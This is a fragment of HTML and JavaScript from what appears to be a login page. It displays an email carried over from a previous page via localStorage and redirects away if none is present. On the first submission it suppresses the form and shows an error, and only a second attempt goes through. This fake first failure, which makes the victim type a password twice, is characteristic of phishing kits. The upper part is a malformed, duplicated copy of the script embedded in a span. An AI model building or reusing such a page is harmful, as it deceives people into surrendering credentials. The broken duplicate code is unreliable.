                        <span id="memberId">

                            document.addEventListener(

                                const email = localStorage.getItem("userEmail"); // Retrieve email from localStorage
                                if (email) {
                                  document.getElementById(
                                    "memberId"
                                  ).textContent = email; // Display email in the span
                                } else {
                                  console.error(
                                    "No userEmail found in localStorage."
                                  );
                                  window.location.href = "index.html"; // Redirect back if no email is found
                                }
                              }
                            );
                          </script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const email = localStorage.getItem("userEmail"); // Retrieve email from localStorage
        if (email) {
          document.getElementById("memberId").textContent = email; // Display email in the span
        } else {
          console.error("No userEmail found in localStorage.");
          window.location.href = "index.html"; // Redirect back if no email is found
        }

        const form = document.querySelector('form[data-hook="form"]');
        const errorWell = document.querySelector('[data-hook="well"]');
        let submissionAttempted = false;

        // Hide the error message initially
        errorWell.classList.remove("is-visible");

        form.addEventListener("submit", function (event) {
          if (!submissionAttempted) {
            event.preventDefault(); // Prevent form submission on the first attempt
            errorWell.classList.add("is-visible"); // Reveal the error message
            submissionAttempted = true; // Mark that the first attempt has been made
          }
        });
      });
